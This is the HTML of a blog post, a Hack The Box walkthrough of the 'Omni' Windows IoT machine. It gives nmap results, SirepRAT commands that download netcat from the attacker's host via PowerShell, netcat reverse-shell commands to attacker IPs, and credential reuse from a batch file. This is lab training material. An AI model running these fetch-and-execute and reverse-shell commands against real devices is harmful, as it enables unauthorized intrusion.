@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="K3nX">
+
+
+
+
+
+<title>Omni</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+
+    <link rel="stylesheet" href="/css/style.css">
+
+
+
+
+    <!-- scripts list from _config.yml -->
+
+    <script src="/js/script.js"></script>
+
+    <script src="/js/tocbot.min.js"></script>
+
+
+
+
+
+
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">K3nX</a></div>
+            <div class="menu navbar-right">
+
+                    <a class="menu-item" href="/archives">Posts</a>
+
+                    <a class="menu-item" href="/category">Categories</a>
+
+                    <a class="menu-item" href="/tag">Tags</a>
+
+
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">K3nX</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+
+                    <a class="menu-item" href="/archives">Posts</a>
+
+                    <a class="menu-item" href="/category">Categories</a>
+
+                    <a class="menu-item" href="/tag">Tags</a>
+
+
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+
+
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+
+
+
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Omni</h1>
+
+                <div class="post-meta">
+
+
+
+
+                        <span class="post-category">
+                    Category:
+
+                                <a href="/categories/Hackthebox/">Hackthebox</a>
+
+                        </span>
+
+                </div>
+
+        </header>
+
+        <div class="post-content">
+            <h3 id="Omni"><a href="#Omni" class="headerlink"
+                title="Omni"></a>Omni</h3><ul>
+              <li>This Machine name is Omni and IP Address is 10.10.10.204</li>
+  </li><img src="infocard.png" alt="Sample Image">
+</ul>
+<h3 id="Nmap"><a href="#Nmap" class="headerlink"
+    title="Nmap"></a>Nmap</h3>
+<pre><code class="bash">#cat omni.nmap
+# Nmap 7.80 scan initiated Sun Aug 23 23:19:10 2020 as: nmap -sSV -O -A -T4 -sC -oN omni.nmap -Pn -p- 10.10.10.204
+Nmap scan report for 10.10.10.204
+Host is up (0.30s latency).
+Not shown: 65529 filtered ports
+PORT      STATE SERVICE  VERSION
+135/tcp   open  msrpc    Microsoft Windows RPC
+5985/tcp  open  upnp     Microsoft IIS httpd
+8080/tcp  open  upnp     Microsoft IIS httpd
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Windows Device Portal
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn't have a title.
+29817/tcp open  unknown
+29819/tcp open  arcserve ARCserve Discovery
+29820/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port29820-TCP:V=7.80%I=7%D=8/23%Time=5F42FA2E%P=x86_64-unknown-linux-gn
+SF:u%r(NULL,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(GenericLines
+SF:,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(Help,10,"\*LY\xa5\xf
+SF:b`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(JavaRMI,10,"\*LY\xa5\xfb`\x04G\xa9m\
+SF:x1c\xc9}\xc8O\x12");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows XP (86%)
+OS CPE: cpe:/o:microsoft:windows_xp::sp2
+Aggressive OS guesses: Microsoft Windows XP SP2 (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 8080/tcp)
+HOP RTT       ADDRESS
+1   336.29 ms 10.10.16.1
+2   336.50 ms 10.10.10.204
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Aug 23 23:23:53 2020 -- 1 IP address (1 host up) scanned in 282.72 seconds
+</code></pre>
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><ul>
+<li><p>Previous Nmap Result , Port 8080 Microsoft IIS httpd is open</p>
+</li>
+<li><p>I open browser and type this ip address , web page show like this , need username and password to login</p>
+</li>
+<li><p>I tried to bypass this login , It's not ok </p>
+</li>
+<li><p>In this time , my fri told me this is window IOT box</p>
+</li>
+<li><p>I got hint , I search at google. After few min searching in Google . I found interesting one Github Repo</p>
+</li>
+<li><p>This is RCE as System on Windows IOT Core  <a href="https://github.com/SafeBreach-Labs/SirepRAT">SirepRAT</a>Here </p>
+</li>
+<li><p>I found SirepRAP has a function , this is Run Arbitrary Program </p></li>
+<li><p>I download netcat 64 bit binary and start python simple http server </p></li>
+</ul>
+<h3 id="lowprivshell"><a
+    href="#lowprivshell" class="headerlink" title="Low Priv Shell"></a>Low Priv Shell</h3><ul>
+<li>Now Let run SirepRAT script </li>
+<li>This command is successful . Check simple http server , You can found GET Request from machine ip address. 
+</li>
+<img src="ominifiledownload.png" alt="Sample Image">
+<pre><code class="bash">#python2 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://10.10.16.2/nc64.exe" --v
+</code></pre>
+<li>Start your netcat listener</li>
+<li><p>Now execute our uploaded netcat on this box</p>
+</li>
+<li>In my netcat listener session , I got reverse shell</li>
+<img src="ominifilexecute.png" alt="File Execute">
+<pre><code class="bash">#python2 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.14.208 1234 -e powershell.exe" --v
+</code></pre>
+<li>I type <code>whoami</code> command to check user but this <code>whoami</code> command is not work </li>
+<li>I used <code>$env:UserName</code> to know i got reverse shell from what user </li>
+<img src="ominiuser.png" alt="Omini User">
+<li>I got low privileges shell as user omini </li>
+</ul>
+<h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><ul>
+<li>After few minutes finding and Enumeration , I found one Interesting folder </li>
+<li>This is PackageManagement Folder locate in <code>C:\Program Files\WindowsPowerShell\Modules\ </code> Path </li>
+<img src="ominiintfiles.png" alt="Interested File">
+<li>I used <code>dir</code> command I found 1.0. blah blah folder</li>
+<li>I used <code>dir -force</code> command , I found one file this is <b>r.bat</b></li>
+<img src="ominirbat.png" alt="Dir Force Mode">
+<li>In this <b>r.bat</b> file I found the credentials of User App and Administrator</li>
+<li>I login with user <b>App</b> credentials to IIS WebServer run in port 8080</li>
+<li>Login successful</li>
+<img src="ominiwebuser.png" alt="IIS Login as User">
+<li>In this WebPage , I found one this is run command options in <b>Process</b></li>
+<li>I think we can run system command from this run command</li>
+<img src="ominiruncommand.png" alt="Run Command">
+<li>I start ncat listener at port 4444 on my host </li>
+<li>I run <code class="bash">C:\Windows\System32\spool\drivers\color\nc.exe 10.10.16.2 4444 -e powershell.exe</code></li>
+<li>Boom I got Reverse Shell Connection </li>
+<img src="ominiusershell.png" alt="User Shell">
+<li>Previous User Omini Shell I found <code>whoami</code> command is not work in this machine </li>
+<li>I used <code>$env:UserName</code> command again to check what user i got </li>
+<li>I got reverse shell as User <b>App</b></li>
+<li>I found <code>C:\Users</code>dir but I found only <b>Public Folder</b></li>
+<img src="ominiuserdir.png" alt="User">
+
+</ul>
+<h3 id="User_Flag"><a href="#User_Flag" class="headerlink" title="User_Flag"></a>Finding User Flag</h3>
+<ul>
+    <li>I upload winPEAS.exe and run this but i face some error in running this winpeas.exe file</li>
+    <li>I try with winPEAS.bat , It's Work</li>
+    <li>After Running WinPEAS and as it result</li>
+    <img src="ominimounted.png" alt="Strange Mount Disk">
+    <li>I found three mounted disk but I found U: in this Result</li>
+    <li>can see C: and D: in most Window OS</li>
+    <li>This Mount Disk U: is Interesting</li>
+    <li>I go to this drive U: and check some folder</li>
+    <img src="ominiUmount.png" alt="Checking U: Disk">
+    <li>I found user <b>App</b> Home Folder in <code>U:\Users\App</code> and I found <b>user.txt</b> in this Path</li>
+    <li>I used <code>type</code> to see the flag content in this user.txt file</li>
+    <li>But I found Strange Content in this user.txt </li>
+    <img src="ominiuserflagencrypt.png" alt="User Flag Encrypt">
+    <li>I can't read this because it look like to be encrypted</li>
+    <li>I use google and search what is this . I found </li>
+    <li>We can use this function to see plaintext content in this file</li>
+    <pre><code class="bash">$credential = Import-CliXml -PAth U:\Users\app\user.txt
+$credential.GetNetworkCredential().Password</code></pre>
+    <img src="ominiuserflagdecrypt.png" alt="Decrypt User Flag">
+    <li> Finally I got User Flag </li>
+</ul>
+
+<h3 id="root"><a href="#root" class="headerlink" title="root"></a>Root</h3>
+<ul>
+    <li>Perviously I found <b>Administrator credentials in <code>C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat</code> file </b></li>
+    <li>I used this Administrator credential to login IIS Web Server running at port 8080</li>
+    <li>Login successful and In Previous User Session </li>
+    <li>Start ncat listener in my host </li>
+    <li>Go to Processes and  Run command </li>
+    <li>Run command like user shell command </li>
+    <code>C:\Windows\System32\spool\drivers\color\nc.exe IP PORT -e powershell.exe</code>
+    <li>I got reverse shell as Administrator </li>
+    <img src="ominiroot.png" alt="Root">
+    <li>I found root.txt in <code>U:\Users\Administrator\</code> Path</li>
+    <pre><code class="bash">$credential = Import-CliXml -PAth U:\Users\Administrator\root.txt
+$credential.GetNetworkCredential().Password</code></pre>
+<img src="ominirootflag.png" alt="Root Flag">
+<li> Finally I got Root Flag</li>
+<li><b>Thank For Reading My WriteUp </b></li>
+<li><b>I hope you will enjoy </b></li>
+</ul>
+
+
+
+
+	</div>
+
+
+            <section class="post-copyright">
+
+
+
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright K3nX (c) 2019</span>
+                    </p>
+
+
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+
+
+            </section>
+
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+
+
+                        <a href="/tags/Hackthebox/"># Hackthebox</a>
+
+
+
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+
+            <a class="prev" rel="prev" href="/hackthebox/machines/OpenKeyS/">OpenKeyS</a>
+
+
+            <a class="next" rel="next" href="/hackthebox/machines/Cache/">Cache</a>
+
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© K3nX </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
